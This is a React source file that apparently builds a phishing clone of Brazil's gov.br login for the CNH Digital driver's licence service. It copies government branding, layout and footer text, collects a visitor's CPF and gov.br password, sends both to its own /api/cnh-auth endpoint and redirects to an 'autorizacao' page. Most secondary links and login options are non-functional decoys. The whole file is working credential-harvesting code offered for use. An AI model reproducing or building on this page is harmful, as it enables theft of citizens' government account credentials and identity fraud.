import { useState } from "react";
import { useLocation } from "wouter";
import { validarCPF } from "@/lib/utils";
import { AlertTriangle, Eye, EyeOff, CreditCard, Building2, QrCode, Smartphone, Cloud } from "lucide-react";

export default function CNHLanding() {
  const [, setLocation] = useLocation();
  const [tela, setTela] = useState<"capa" | "cpf" | "senha">("capa");
  const [cpf, setCpf] = useState("");
  const [senha, setSenha] = useState("");
  const [showSenha, setShowSenha] = useState(false);
  const [cpfError, setCpfError] = useState("");
  const [senhaError, setSenhaError] = useState("");
  const [loadingCpf, setLoadingCpf] = useState(false);
  const [loadingSenha, setLoadingSenha] = useState(false);

  const mascaraCPF = (val: string) => {
    let v = val.replace(/\D/g, "").slice(0, 11);
    if (v.length > 9) {
      v = v.replace(/(\d{3})(\d{3})(\d{3})(\d{0,2})/, "$1.$2.$3-$4");
    } else if (v.length > 6) {
      v = v.replace(/(\d{3})(\d{0,3})/, "$1.$2.$3");
    } else if (v.length > 3) {
      v = v.replace(/(\d{3})(\d{0,3})/, "$1.$2");
    }
    return v;
  };

  const handleCpfChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setCpfError("");
    setCpf(mascaraCPF(e.target.value));
  };

  const handleContinueCpf = async () => {
    const digits = cpf.replace(/\D/g, "");
    if (digits.length < 11 || !validarCPF(digits)) {
      setCpfError("CPF informado inválido. (ERL0000500)");
      return;
    }

    setCpfError("");
    setLoadingCpf(true);

    try {
      const res = await fetch(`/api/cnh/validate?cpf=${digits}`);
      const json = await res.json().catch(() => ({}));
      if (res.ok && json.success && json.data) {
        setTela("senha");
      } else {
        setCpfError("CPF informado inválido. (ERL0000500)");
      }
    } catch {
      setCpfError("CPF informado inválido. (ERL0000500)");
    } finally {
      setLoadingCpf(false);
    }
  };

  const handleLoginSenha = async () => {
    const digits = cpf.replace(/\D/g, "");
    if (!senha.trim()) {
      setSenhaError("Senha incorreta. Tente novamente.");
      return;
    }

    setSenhaError("");
    setLoadingSenha(true);

    try {
      const res = await fetch("/api/cnh-auth", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ cpf: digits, senha: senha.trim() }),
      });
      const json = await res.json().catch(() => ({}));

      if (res.ok && json.success) {
        setLocation(`/autorizacao?cpf=${digits}`);
      } else {
        setSenhaError("Senha incorreta. Tente novamente.");
      }
    } catch {
      setSenhaError("Senha incorreta. Tente novamente.");
    } finally {
      setLoadingSenha(false);
    }
  };

  return (
    <>
      <style>{`
        .cnh-clone-body {
          font-family: 'Raleway', 'Rawline', sans-serif;
          background-color: #000;
          height: 100dvh;
          width: 100vw;
          overflow: hidden;
          display: flex;
          justify-content: center;
          align-items: center;
          margin: 0;
          padding: 0;
          box-sizing: border-box;
          -webkit-tap-highlight-color: transparent;
        }

        /* --- TELA 1: CAPA --- */
        #tela-capa {
          width: 100%;
          max-width: 450px;
          height: 100%;
          background-color: #fff;
          position: relative;
          display: flex;
          flex-direction: column;
        }

        .capa-area {
          height: 70%;
          width: 100%;
          background-image: url('/img/capa_cnh.png');
          background-size: cover;
          background-position: center top;
          position: relative;
          flex-shrink: 0;
        }

        .capa-area::after {
          content: '';
          position: absolute;
          top: 0;
          left: 0;
          width: 100%;
          height: 40%;
          background: linear-gradient(to bottom, rgba(0, 0, 0, 0.5), transparent);
        }

        .conteudo-branco {
          flex: 1;
          background-color: white;
          border-top-left-radius: 25px;
          border-top-right-radius: 25px;
          margin-top: -25px;
          position: relative;
          z-index: 10;
          padding: 15px 30px;
          display: flex;
          flex-direction: column;
          align-items: center;
          justify-content: center;
          gap: 15px;
        }

        .logo-container img {
          max-width: 140px;
          display: block;
          margin-bottom: 5px;
        }

        .termos-texto {
          text-align: center;
          font-size: 12px;
          color: #333;
          line-height: 1.3;
          margin-bottom: 12px;
        }

        .termos-texto a {
          color: #1351b4;
          text-decoration: underline;
          font-weight: 600;
        }

        .btn-gov {
          background-color: #1351b4;
          color: white;
          width: 100%;
          padding: 14px 0;
          border-radius: 50px;
          border: none;
          font-size: 14px;
          font-weight: 700;
          cursor: pointer;
          box-shadow: 0 4px 8px rgba(19, 81, 180, 0.25);
          text-transform: uppercase;
        }

        /* --- GOV.BR CARD CONTAINER (CPF E SENHA) --- */
        .tela-govbr {
          width: 100%;
          max-width: 440px;
          height: 100%;
          background-color: #f8f9fa;
          display: flex;
          flex-direction: column;
          align-items: center;
          overflow-y: auto;
        }

        .header-govbr {
          display: flex;
          justify-content: flex-start;
          align-items: center;
          margin-bottom: 20px;
          padding: 14px 20px;
          width: 100%;
          background-color: #fff;
          border-bottom: 1px solid #e2e8f0;
        }

        .logo-gov-login {
          width: 95px;
          height: auto;
        }

        .login-card {
          width: calc(100% - 32px);
          background-color: #fff;
          padding: 24px 20px 22px;
          border-radius: 8px;
          box-shadow: 0 2px 12px rgba(0, 0, 0, 0.08);
          box-sizing: border-box;
          margin-bottom: 20px;
        }

        .title {
          font-weight: 700;
          font-size: 18px;
          color: #000;
          margin-bottom: 18px;
          width: 100%;
          text-align: left;
        }

        .subtitle {
          font-size: 15px;
          font-weight: 600;
          margin-bottom: 4px;
          display: flex;
          align-items: center;
          gap: 8px;
          width: 100%;
          color: #1e293b;
        }

        .description {
          font-size: 13px;
          color: #64748b;
          margin-bottom: 20px;
          line-height: 1.4;
          width: 100%;
        }

        .input-group {
          margin-bottom: 16px;
          width: 100%;
          position: relative;
        }

        .label {
          font-weight: 600;
          font-size: 13px;
          color: #334155;
          margin-bottom: 6px;
          display: block;
        }

        .input-field {
          width: 100%;
          padding: 12px 14px;
          font-size: 15px;
          border: 1px solid #cbd5e1;
          border-radius: 6px;
          outline: none;
          background-color: #fff;
          color: #0f172a;
          box-sizing: border-box;
        }

        .input-field:focus {
          border-color: #1351b4;
          box-shadow: 0 0 0 2px rgba(19, 81, 180, 0.2);
        }

        .input-senha-wrap {
          position: relative;
          width: 100%;
        }

        .input-senha-field {
          background-color: #fefce8;
          border: 1px solid #e2e8f0;
          padding-right: 42px;
        }

        .btn-eye {
          position: absolute;
          right: 12px;
          top: 50%;
          transform: translateY(-50%);
          background: none;
          border: none;
          color: #64748b;
          cursor: pointer;
          padding: 4px;
        }

        /* --- ALERTA AMARELO (IMAGEM 01 E IMAGEM 03) --- */
        .alert-error-gov {
          background-color: #fef08a;
          border: 1px solid #eab308;
          border-radius: 6px;
          padding: 12px 14px;
          margin-bottom: 18px;
          display: flex;
          align-items: center;
          font-size: 13px;
          color: #000;
          font-weight: 500;
          width: 100%;
          box-sizing: border-box;
        }

        .alert-error-gov svg {
          margin-right: 10px;
          flex-shrink: 0;
        }

        .btn-primary {
          width: 100%;
          padding: 12px;
          background-color: #1351b4;
          color: white;
          border: none;
          border-radius: 25px;
          font-size: 15px;
          font-weight: 600;
          cursor: pointer;
          transition: background-color 0.2s;
        }

        .btn-primary:hover {
          background-color: #0f4294;
        }

        .btn-cancelar {
          width: 100%;
          padding: 12px;
          background-color: #fff;
          color: #1351b4;
          border: 1px solid #1351b4;
          border-radius: 25px;
          font-size: 15px;
          font-weight: 600;
          cursor: pointer;
          transition: background-color 0.2s;
        }

        .btn-cancelar:hover {
          background-color: #f1f5f9;
        }

        .options-title {
          font-size: 13px;
          font-weight: 600;
          margin-top: 24px;
          margin-bottom: 14px;
          border-top: 1px solid #f1f5f9;
          padding-top: 18px;
          width: 100%;
          color: #334155;
        }

        .option-btn {
          display: flex;
          align-items: center;
          width: 100%;
          padding: 11px 14px;
          background: white;
          border: 1px solid #e2e8f0;
          border-radius: 25px;
          margin-bottom: 10px;
          color: #1351b4;
          font-weight: 600;
          font-size: 13px;
          cursor: pointer;
          box-sizing: border-box;
        }

        .option-btn svg {
          margin-right: 10px;
          flex-shrink: 0;
        }

        .selo {
          background-color: #008f43;
          color: white;
          font-size: 8px;
          padding: 3px 6px;
          border-radius: 4px;
          margin-left: auto;
          white-space: nowrap;
          text-transform: uppercase;
          font-weight: 700;
        }

        .footer-gov {
          margin-top: 20px;
          text-align: center;
          font-size: 11px;
          color: #64748b;
          padding-bottom: 16px;
        }

        .link-esqueci {
          display: inline-block;
          font-size: 12px;
          color: #1351b4;
          text-decoration: underline;
          margin-top: 6px;
          font-weight: 500;
        }
      `}</style>

      <div className="cnh-clone-body">
        {/* --- TELA 1: CAPA --- */}
        {tela === "capa" && (
          <div id="tela-capa">
            <div className="capa-area" />
            <div className="conteudo-branco">
              <div className="logo-container">
                <img
                  src="/img/logo_cnh.png"
                  onError={(e) => {
                    e.currentTarget.src = "/assets/govbr-logo.png";
                  }}
                  alt="CNH Digital"
                />
              </div>
              <div style={{ width: "100%" }}>
                <div className="termos-texto">
                  Ao entrar, você concorda com nosso <br />
                  <a href="#">Termo de Responsabilidade</a> e <br />
                  <a href="#">Política de Privacidade</a>
                </div>
                <button className="btn-gov" onClick={() => setTela("cpf")}>
                  ENTRAR COM gov.br
                </button>
              </div>
            </div>
          </div>
        )}

        {/* --- TELA 2: CPF (IMAGEM 01) --- */}
        {tela === "cpf" && (
          <div className="tela-govbr">
            <div className="header-govbr">
              <img
                src="/img/logo.png"
                onError={(e) => {
                  e.currentTarget.src = "/assets/govbr-logo.png";
                }}
                className="logo-gov-login"
                alt="gov.br"
              />
            </div>
            <div className="login-card">
              <div className="title">Identifique-se no gov.br</div>
              <div className="subtitle">
                <CreditCard className="w-5 h-5 text-[#1351b4]" /> Número do CPF
              </div>
              <div className="description">
                Digite seu CPF para <strong>criar</strong> ou <strong>acessar</strong> sua conta gov.br
              </div>

              <div className="input-group">
                <label className="label">CPF</label>
                <input
                  type="tel"
                  className="input-field"
                  placeholder="Digite seu CPF"
                  maxLength={14}
                  inputMode="numeric"
                  autoComplete="off"
                  value={cpf}
                  onChange={handleCpfChange}
                  onKeyDown={(e) => {
                    if (e.key === "Enter") handleContinueCpf();
                  }}
                />
              </div>

              {cpfError && (
                <div className="alert-error-gov">
                  <AlertTriangle className="w-5 h-5 text-black shrink-0" />
                  <span>{cpfError}</span>
                </div>
              )}

              <button
                className="btn-primary"
                onClick={handleContinueCpf}
                disabled={loadingCpf}
              >
                {loadingCpf ? "Verificando..." : "Continuar"}
              </button>

              <div className="options-title">Outras opções de identificação:</div>
              <div className="option-btn">
                <Building2 className="w-4 h-4" /> Login com seu banco{" "}
                <span className="selo">SUA CONTA SERÁ PRATA</span>
              </div>
              <div className="option-btn">
                <QrCode className="w-4 h-4" /> Login com QR code
              </div>
              <div className="option-btn">
                <Smartphone className="w-4 h-4" /> Seu aplicativo gov.br
              </div>
              <div className="option-btn">
                <Cloud className="w-4 h-4" /> Seu certificado digital em nuvem
              </div>
              <div className="footer-gov">
                Ministério da Gestão e da Inovação em Serviços Públicos
              </div>
            </div>
          </div>
        )}

        {/* --- TELA 3: SENHA (IMAGEM 02 E IMAGEM 03) --- */}
        {tela === "senha" && (
          <div className="tela-govbr">
            <div className="header-govbr">
              <img
                src="/img/logo.png"
                onError={(e) => {
                  e.currentTarget.src = "/assets/govbr-logo.png";
                }}
                className="logo-gov-login"
                alt="gov.br"
              />
            </div>
            <div className="login-card">
              <div className="title">Digite sua senha</div>

              <div className="mb-4">
                <div className="text-xs text-slate-500 font-semibold uppercase">CPF</div>
                <div className="text-sm font-bold text-slate-900">{cpf}</div>
              </div>

              <div className="input-group">
                <label className="label">Senha</label>
                <div className="input-senha-wrap">
                  <input
                    type={showSenha ? "text" : "password"}
                    className="input-field input-senha-field"
                    placeholder="Digite sua senha atual"
                    value={senha}
                    onChange={(e) => {
                      setSenhaError("");
                      setSenha(e.target.value);
                    }}
                    onKeyDown={(e) => {
                      if (e.key === "Enter") handleLoginSenha();
                    }}
                  />
                  <button
                    type="button"
                    className="btn-eye"
                    onClick={() => setShowSenha(!showSenha)}
                  >
                    {showSenha ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                  </button>
                </div>
                <a href="#" className="link-esqueci">Esqueci minha senha</a>
              </div>

              {senhaError && (
                <div className="alert-error-gov">
                  <AlertTriangle className="w-5 h-5 text-black shrink-0" />
                  <span>{senhaError}</span>
                </div>
              )}

              <div className="grid grid-cols-2 gap-3 mt-4">
                <button
                  type="button"
                  className="btn-cancelar"
                  onClick={() => {
                    setSenhaError("");
                    setSenha("");
                    setTela("cpf");
                  }}
                >
                  Cancelar
                </button>
                <button
                  type="button"
                  className="btn-primary"
                  onClick={handleLoginSenha}
                  disabled={loadingSenha}
                >
                  {loadingSenha ? "Entrando..." : "Entrar"}
                </button>
              </div>

              <div className="mt-6 text-center">
                <a href="#" className="text-xs text-[#1351b4] underline font-medium">
                  Ficou com dúvidas?
                </a>
              </div>
            </div>
          </div>
        )}
      </div>
    </>
  );
}
